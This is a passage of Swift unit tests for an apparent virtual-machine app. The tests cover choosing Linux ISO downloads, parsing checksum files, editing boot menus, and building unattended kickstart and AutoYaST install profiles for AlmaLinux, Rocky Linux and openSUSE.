        XCTAssertEqual(LinuxISODownloader.matches(LinuxISODownloader.Distribution.kali.checksumPattern(for: name), in: listing), ["SHA256SUMS"])
        let sums = """
            0dd3e70f2e0b092286b29355450bc79a034a13fb1d5b4bf83c297149115258cd  kali-linux-2026.3-installer-netinst-amd64.iso
            a986c7fe0f8e887a77e7ea9f868da88eae04e7ac780ae75e6b702f243b63bf8d  kali-linux-2026.3-installer-netinst-arm64.iso
            5ad419b75bc29abc0f41047481ff46ff55c11a85588eb4c474892dca874100b7  kali-linux-2026.3-installer-netinst-arm64.iso.torrent
            """
        XCTAssertEqual(LinuxISODownloader.hash(of: name, in: sums), "a986c7fe0f8e887a77e7ea9f868da88eae04e7ac780ae75e6b702f243b63bf8d")
        // The .torrent's line alone is no answer for the installer.
        XCTAssertNil(LinuxISODownloader.hash(of: name, in: "5ad419b75bc29abc0f41047481ff46ff55c11a85588eb4c474892dca874100b7  \(name).torrent"))
        // A later release is the newest.
        XCTAssertEqual(newest(.kali, in: listing + "kali-linux-2026.4-installer-netinst-arm64.iso"),
                       "kali-linux-2026.4-installer-netinst-arm64.iso")
        XCTAssertEqual(LinuxISODownloader.Distribution(rawValue: "kali"), .kali)
    }

    /// The first three's lists still read: Ubuntu's "*name", Fedora's
    /// "SHA256 (name) = hash".
    func testExistingForms() {
        let hex = String(repeating: "ab", count: 32)
        XCTAssertEqual(LinuxISODownloader.hash(of: "ubuntu.iso", in: "\(hex) *ubuntu.iso"), hex)
        XCTAssertEqual(LinuxISODownloader.hash(of: "debian.iso", in: "\(hex)  debian.iso"), hex)
        XCTAssertEqual(LinuxISODownloader.hash(of: "Fedora.iso", in: "SHA256 (Fedora.iso) = \(hex)"), hex)
        XCTAssertNil(LinuxISODownloader.hash(of: "Fedora.iso", in: "# Fedora.iso: 123 bytes"))
    }

    /// AlmaLinux's and Rocky's folders list a "10-latest" copy and, for
    /// Rocky, a CHECKSUM per file; the numbered boot ISO and the folder's
    /// own CHECKSUM are wanted (2026-10-30, the real listings).
    func testAlmaLinuxAndRocky() throws {
        let alma = """
            <a href="AlmaLinux-10-latest-aarch64-boot.iso">x</a> <a href="AlmaLinux-10.2-aarch64-boot.iso">x</a>
            <a href="AlmaLinux-10.2-aarch64-boot.iso.manifest">x</a> <a href="AlmaLinux-10.2-aarch64-dvd.iso">x</a>
            <a href="AlmaLinux-10.2-aarch64-minimal.iso">x</a> <a href="CHECKSUM">x</a>
            """
        XCTAssertEqual(newest(.almalinux, in: alma), "AlmaLinux-10.2-aarch64-boot.iso")
        XCTAssertEqual(newest(.almalinux, in: alma + "AlmaLinux-10.10-aarch64-boot.iso"), "AlmaLinux-10.10-aarch64-boot.iso")
        let rocky = """
            <a href="CHECKSUM">x</a> <a href="CHECKSUM.asc">x</a>
            <a href="Rocky-10-latest-aarch64-boot.iso">x</a> <a href="Rocky-10-latest-aarch64-boot.iso.CHECKSUM">x</a>
            <a href="Rocky-10.2-aarch64-boot.iso">x</a> <a href="Rocky-10.2-aarch64-boot.iso.CHECKSUM">x</a>
            <a href="Rocky-10.2-aarch64-dvd1.iso">x</a>
            """
        let name = try XCTUnwrap(newest(.rocky, in: rocky))
        XCTAssertEqual(name, "Rocky-10.2-aarch64-boot.iso")
        XCTAssertEqual(LinuxISODownloader.matches(LinuxISODownloader.Distribution.rocky.checksumPattern(for: name), in: rocky), ["CHECKSUM"])
        XCTAssertEqual(LinuxISODownloader.matches(LinuxISODownloader.Distribution.almalinux.checksumPattern(for: "x"), in: alma), ["CHECKSUM"])
        let sums = """
            # Rocky-10.2-aarch64-boot.iso: 1120931840 bytes
            SHA256 (Rocky-10.2-aarch64-boot.iso) = 33c2d3dfd5f947b3201478180b549bb2995bd9573c2776b384e5ec1dd47326c0
            SHA256 (Rocky-10-latest-aarch64-boot.iso) = 33c2d3dfd5f947b3201478180b549bb2995bd9573c2776b384e5ec1dd47326c1
            """
        XCTAssertEqual(LinuxISODownloader.hash(of: name, in: sums), "33c2d3dfd5f947b3201478180b549bb2995bd9573c2776b384e5ec1dd47326c0")
    }
}

// MARK: - AlmaLinux and Rocky Linux, Fedora's way (2026-10-30)

final class EnterpriseInstallTests: XCTestCase {
    private let account = UbuntuAccount(realName: "Amena T", userName: "amena", passwordHash: "$6$salt$hash",
                                        signInAutomatically: true)

    func testDiscsAreKnown() throws {
        let alma = UbuntuInstallPipeline.enterpriseISOInfo(volumeID: "AlmaLinux-10-2-aarch64-dvd",
                                                           discInfo: "1779571190.291881\n10.2\naarch64\n", hasInstallerKernel: true)
        XCTAssertEqual(alma.distro, .almalinux)
        XCTAssertEqual(alma.version, "10.2")
        XCTAssertEqual(alma.majorVersion, 10)
        XCTAssertEqual(alma.spokenName, "AlmaLinux 10.2")
        XCTAssertFalse(alma.isLiveImage)
        XCTAssertNil(UbuntuInstallPipeline.problem(with: alma))
        let rocky = UbuntuInstallPipeline.enterpriseISOInfo(volumeID: "Rocky-10-2-aarch64-dvd", discInfo: "", hasInstallerKernel: true)
        XCTAssertEqual(rocky.distro, .rocky)
        XCTAssertEqual(rocky.version, "10.2", "from the label when there's no .discinfo")
        XCTAssertTrue(rocky.isARM64)
        let nine = UbuntuInstallPipeline.enterpriseISOInfo(volumeID: "Rocky-9-6-aarch64-dvd",
                                                           discInfo: "1\n9.6\naarch64\n", hasInstallerKernel: true)
        XCTAssertTrue(try XCTUnwrap(UbuntuInstallPipeline.problem(with: nine)).contains("Rocky Linux 10 or later"))
        let intel = UbuntuInstallPipeline.enterpriseISOInfo(volumeID: "AlmaLinux-10-2-x86_64-dvd",
                                                            discInfo: "1\n10.2\nx86_64\n", hasInstallerKernel: true)
        XCTAssertTrue(try XCTUnwrap(UbuntuInstallPipeline.problem(with: intel)).contains("aarch64"))
        XCTAssertTrue(LinuxDistro.rocky.usesKickstart)
        XCTAssertTrue(GuestOS.almalinux.isLinux)
        XCTAssertEqual(GuestOS(rawValue: "rocky")?.displayName, "Rocky Linux")
    }

    func testBootMenuEditIsFedoras() throws {
        let menu = """
            set default="1"
            set timeout=60
            menuentry 'Install AlmaLinux 10.2' --class red --class gnu-linux --class gnu --class os {
            \tlinux /images/pxeboot/vmlinuz inst.stage2=hd:LABEL=AlmaLinux-10-2-aarch64-dvd ro
            \tinitrd /images/pxeboot/initrd.img
            }
            """
        let edited = try XCTUnwrap(UbuntuInstallPipeline.editedFedoraBootMenu(menu))
        XCTAssertTrue(edited.contains("inst.ks=hd:LABEL=AlmaLinux-10-2-aarch64-dvd:/nocloud/ks.cfg"))
        XCTAssertTrue(edited.contains("set default=\"0\""))
    }

    func testKickstarts() throws {
        let alma = UbuntuInstallPipeline.enterpriseKickstart(account: account, hostName: "h", timeZone: "UTC",
                                                             distro: .almalinux, version: "10.2", disk: "vda")
        for line in ["url --url=\"https://repo.almalinux.org/almalinux/10/BaseOS/aarch64/os/\"\n",
                     "repo --name=AppStream --baseurl=\"https://repo.almalinux.org/almalinux/10/AppStream/aarch64/os/\"\n",
                     "\n@^graphical-server-environment\n", "\norca\n", "\nspice-vdagent\n", "\nspice-webdavd\n",
                     "\nqemu-guest-agent\n", "\nautopart\n", "ignoredisk --only-use=vda\n", "--groups=wheel",
                     "AlmaLinux installed by AVM", "AlmaLinux install failed", "\npoweroff\n"] {
            XCTAssertTrue(alma.contains(line), line)
        }
        XCTAssertFalse(alma.contains("btrfs"))
        XCTAssertFalse(alma.contains("Fedora"))
        XCTAssertFalse(alma.contains("fedoraproject"))
        XCTAssertEqual(alma.components(separatedBy: "\n%end\n").count, 4)
        let rocky = UbuntuInstallPipeline.enterpriseKickstart(account: account, hostName: "h", timeZone: "UTC",
                                                              distro: .rocky, version: "10.2", disk: "vda")
        XCTAssertTrue(rocky.contains("url --url=\"https://download.rockylinux.org/pub/rocky/10/BaseOS/aarch64/os/\"\n"))
        XCTAssertFalse(rocky.contains("spice-webdavd\n"), "Rocky has no spice-webdavd package")
        XCTAssertTrue(rocky.contains("Rocky Linux installed by AVM"))
        // RHEL's guest agent is let answer guest-exec and guest-file, before the marker.
        let filter = try XCTUnwrap(rocky.range(of: "s/^FILTER_RPC_ARGS=.*/FILTER_RPC_ARGS=\"\"/' /etc/sysconfig/qemu-ga"))
        let marker = try XCTUnwrap(rocky.range(of: "AVMDONE.TAG"))
        XCTAssertLessThan(filter.lowerBound, marker.lowerBound)
        XCTAssertTrue(rocky.contains("(typepermissive virt_qemu_ga_t)"), "and SELinux lets it")
        // The setup script keeps the distribution's dconf profile.
        XCTAssertTrue(rocky.contains("grep -qx 'system-db:local' /etc/dconf/profile/user") ||
                      rocky.contains("grep -qx 'system-db:local' $T/etc/dconf/profile/user"))
    }
}

// MARK: - openSUSE Tumbleweed, YaST and AutoYaST (2026-10-30)

final class OpenSUSEInstallTests: XCTestCase {
    private let account = UbuntuAccount(realName: "Amena & Co <T>", userName: "amena", passwordHash: "$6$salt$hash",
                                        signInAutomatically: true, keyboardLayout: "gb", keyboardVariant: "mac")

    /// The menu of openSUSE-Tumbleweed-NET-aarch64-Snapshot20261020-Media.iso,
    /// cut to its first entries.
    private let menu = """
        if sleep --interruptible 0 ; then
          timeout=60
        fi

        default=1

        menuentry "Boot from Hard Disk" --class opensuse --class gnu-linux --class gnu --class os {
          exit
        }

        menuentry 'Installation' --class opensuse --class gnu-linux --class gnu --class os {
          set gfxpayload=keep
          echo 'Loading kernel ...'
          linux /boot/aarch64/linux splash=silent
          echo 'Loading initial ramdisk ...'
          initrd /boot/aarch64/initrd
        }

        menuentry 'Upgrade' --class opensuse --class gnu-linux --class gnu --class os {
          linux /boot/aarch64/linux splash=silent upgrade=1
        }
        """

    func testBootMenuEdit() throws {
        let edited = try XCTUnwrap(UbuntuInstallPipeline.editedOpenSUSEBootMenu(menu))
        // After YaST's restart the disc powers the machine off (2026-10-31).
        XCTAssertTrue(edited.hasPrefix(UbuntuInstallPipeline.openSUSEMarkerGuardLine + "\n"))
        XCTAssertTrue(UbuntuInstallPipeline.openSUSEMarkerGuardLine.contains("/AVMDONE.TAG; then halt; exit; fi"))
        XCTAssertTrue(edited.contains("linux /boot/aarch64/linux \(UbuntuInstallPipeline.openSUSEKernelArguments) splash=silent\n"))
        XCTAssertTrue(UbuntuInstallPipeline.openSUSEKernelArguments.contains("autoyast=cd:/nocloud/autoinst.xml"))
        XCTAssertEqual(edited.components(separatedBy: "autoyast=").count, 2, "only the installer entry")
        XCTAssertTrue(edited.contains("\ndefault=1\ntimeout=1\n"), "Installation, the second entry, after a second")
        XCTAssertTrue(edited.contains("  timeout=1\n"))
        XCTAssertFalse(edited.contains("timeout=60"))
        XCTAssertNil(UbuntuInstallPipeline.editedOpenSUSEBootMenu("menuentry 'x' { linux /images/pxeboot/vmlinuz }"))
    }

    func testDiscsAreKnown() throws {
        let net = UbuntuInstallPipeline.openSUSEISOInfo(volumeID: "openSUSE-Tumbleweed-NET-aarch64",
                                                         products: "/ openSUSE 20261020-0\n", hasInstallerKernel: true)
        XCTAssertEqual(net.distro, .opensuse)
        XCTAssertEqual(net.version, "20261020")
        XCTAssertEqual(net.spokenName, "openSUSE Tumbleweed")
        XCTAssertNil(UbuntuInstallPipeline.problem(with: net))
        let live = UbuntuInstallPipeline.openSUSEISOInfo(volumeID: "openSUSE-Tumbleweed-GNOME-Live-aarch64",
                                                          products: "", hasInstallerKernel: false)
        XCTAssertTrue(try XCTUnwrap(UbuntuInstallPipeline.problem(with: live)).contains("live image"))
        let intel = UbuntuInstallPipeline.openSUSEISOInfo(volumeID: "openSUSE-Tumbleweed-NET-x86_64",
                                                           products: "", hasInstallerKernel: true)
        XCTAssertTrue(try XCTUnwrap(UbuntuInstallPipeline.problem(with: intel)).contains("aarch64"))
        let leap = UbuntuInstallPipeline.openSUSEISOInfo(volumeID: "openSUSE-Leap-16.0-aarch64",
                                                          products: "", hasInstallerKernel: true)
        XCTAssertTrue(try XCTUnwrap(UbuntuInstallPipeline.problem(with: leap)).contains("Tumbleweed"))
        XCTAssertTrue(GuestOS.opensuse.isLinux)
        XCTAssertEqual(GuestOS(rawValue: "opensuse")?.displayName, "openSUSE")
    }

    /// Well-formed XML whatever the name holds, every answer given, and the
    /// setup and failure scripts inside it.
    func testProfileAnswersEverything() throws {
        let profile = UbuntuInstallPipeline.autoYaSTProfile(account: account, hostName: "amenas-suse",
                                                            timeZone: "America/Chicago", disk: "vda")
        let document = try XMLDocument(xmlString: profile, options: [])
        let root = try XCTUnwrap(document.rootElement())
        XCTAssertEqual(root.name, "profile")
        func text(_ path: String) throws -> [String] {
            try root.nodes(forXPath: path).compactMap(\.stringValue)
        }
        XCTAssertEqual(try text("./*[local-name()='users']/*[local-name()='user']/*[local-name()='username']"), ["amena", "root"])
        XCTAssertEqual(try text("./*[local-name()='users']/*[local-name()='user']/*[local-name()='fullname']"), ["Amena & Co <T>"])
        XCTAssertEqual(try text("./*[local-name()='users']/*[local-name()='user']/*[local-name()='user_password']"),
                       ["$6$salt$hash", "$6$salt$hash"])
        XCTAssertEqual(try text(".//*[local-name()='autologin_user']"), ["amena"])
        XCTAssertEqual(try text(".//*[local-name()='drive']/*[local-name()='device']"), ["/dev/vda"])
        // YaST's own restart ends the install; final_halt only powered off
        // the installed system at its first start (2026-10-31).
        XCTAssertEqual(try text(".//*[local-name()='final_halt']"), [])
        XCTAssertEqual(try text(".//*[local-name()='final_reboot']"), [])
        XCTAssertEqual(try text(".//*[local-name()='products']/*[local-name()='product']"), ["openSUSE"])
        XCTAssertEqual(try text(".//*[local-name()='second_stage']"), ["false"])
        XCTAssertEqual(try text(".//*[local-name()='timezone']/*[local-name()='timezone']"), ["America/Chicago"])
        let packages = try text(".//*[local-name()='package']")
        for package in ["orca", "spice-vdagent", "spice-webdavd", "qemu-guest-agent"] {
            XCTAssertTrue(packages.contains(package), package)
        }
        XCTAssertTrue(try text(".//*[local-name()='pattern']").contains("gnome"))
        let source = try XCTUnwrap(try text(".//*[local-name()='source']").first)
        XCTAssertTrue(source.contains("openSUSE Tumbleweed installed by AVM"))
        XCTAssertTrue(source.contains("AVMFAIL.TAG"))
        XCTAssertTrue(source.contains("|| bash /tmp/avm-failed.sh"))
        // Without automatic sign-in there's no autologin user.
        var manual = account
        manual.signInAutomatically = false
        let other = try XMLDocument(xmlString: UbuntuInstallPipeline.autoYaSTProfile(account: manual, hostName: "h", timeZone: "UTC"))
        XCTAssertEqual(try other.rootElement()?.nodes(forXPath: ".//*[local-name()='autologin_user']").count, 0)
    }

    func testSetupScriptIsOpenSUSEs() throws {
        let script = UbuntuInstallPipeline.openSUSESetupScript(account: account)
        XCTAssertFalse(script.contains("curtin"))
        XCTAssertFalse(script.contains("/target"))
        XCTAssertFalse(script.contains("gdm3"))
        XCTAssertFalse(script.contains("update-grub"))
        XCTAssertTrue(script.contains("\nT=\n"))
        XCTAssertTrue(script.contains("/etc/gdm/custom.conf"))
        XCTAssertTrue(script.contains("chown -R $U: /home/$U/.config"), "openSUSE's users share the users group")
        XCTAssertTrue(script.contains("welcome-dialog-last-shown-version"))
        XCTAssertTrue(script.contains(#""XkbLayout" "%s"\n"#) && script.contains("'gb' 'mac'"))
        XCTAssertTrue(script.contains("grep -qx 'system-db:local' $T/etc/dconf/profile/user ||"))
        let tour = try XCTUnwrap(script.range(of: "01-avm-opensuse"))
        let update = try XCTUnwrap(script.range(of: "\ndconf update\n"))
        XCTAssertLessThan(tour.lowerBound, update.lowerBound)
        let restore = try XCTUnwrap(script.range(of: "restorecon -R"))
        let marker = try XCTUnwrap(script.range(of: "AVMDONE.TAG"))
        XCTAssertLessThan(restore.lowerBound, marker.lowerBound)
        // The heredoc that carries it into the chroot can't end early.
        XCTAssertFalse(script.components(separatedBy: "\n").contains("AVMSETUP"))
        XCTAssertFalse(script.contains("]]>"))
        XCTAssertTrue(UbuntuInstallPipeline.openSUSEFailureScript.contains("sysrq-trigger"))
        XCTAssertTrue(script.contains(#"FILTER_RPC_ARGS=""\n' > $T/etc/sysconfig/qemu-ga"#), "the guest agent may run commands")
        XCTAssertTrue(script.contains(#"[Service]\nPrivateDevices=no\n' > $T/etc/systemd/system/spice-webdavd.service.d/avm.conf"#),
                      "spice-webdavd can open its virtio port")
        let permissive = try XCTUnwrap(script.range(of: "(typepermissive virt_qemu_ga_t)"), "SELinux lets the guest agent do its work")
        XCTAssertLessThan(permissive.lowerBound, marker.lowerBound)
    }

    /// download.opensuse.org's ports folder: the dated NET snapshot, not
    /// "Current", the DVD or a live image, and its own .sha256 beside it.
    func testDownloadPatterns() throws {
        let listing = """
            <a href="./openSUSE-Tumbleweed-DVD-aarch64-Snapshot20261020-Media.iso">x</a>
            <a href="./openSUSE-Tumbleweed-NET-aarch64-Current.iso">x</a>
            <a href="./openSUSE-Tumbleweed-NET-aarch64-Current.iso.sha256">x</a>
            <a href="./openSUSE-Tumbleweed-NET-aarch64-Snapshot20261020-Media.iso">x</a>
            <a href="./openSUSE-Tumbleweed-NET-aarch64-Snapshot20261020-Media.iso.mirrorlist">x</a>
            <a href="./openSUSE-Tumbleweed-NET-aarch64-Snapshot20261020-Media.iso.sha256">x</a>
            <a href="./openSUSE-Tumbleweed-NET-aarch64-Snapshot20261020-Media.iso.sha256.asc">x</a>
            <a href="./openSUSE-Tumbleweed-GNOME-Live-aarch64-Snapshot20261020-Media.iso">x</a>
            """
        let distribution = LinuxISODownloader.Distribution.opensuse
        let name = try XCTUnwrap(LinuxISODownloader.matches(distribution.filePattern, in: listing)
            .max(by: { $0.compare($1, options: .numeric) == .orderedAscending }))
        XCTAssertEqual(name, "openSUSE-Tumbleweed-NET-aarch64-Snapshot20261020-Media.iso")
        XCTAssertEqual(LinuxISODownloader.matches(distribution.checksumPattern(for: name), in: listing), [name + ".sha256"])
        let sums = "33916688227949b0691502ed35f10329ce0047a7312239573bb99a93ce941f82  \(name)\n"
        XCTAssertEqual(LinuxISODownloader.hash(of: name, in: sums), "33916688227949b0691502ed35f10329ce0047a7312239573bb99a93ce941f82")
    }
}
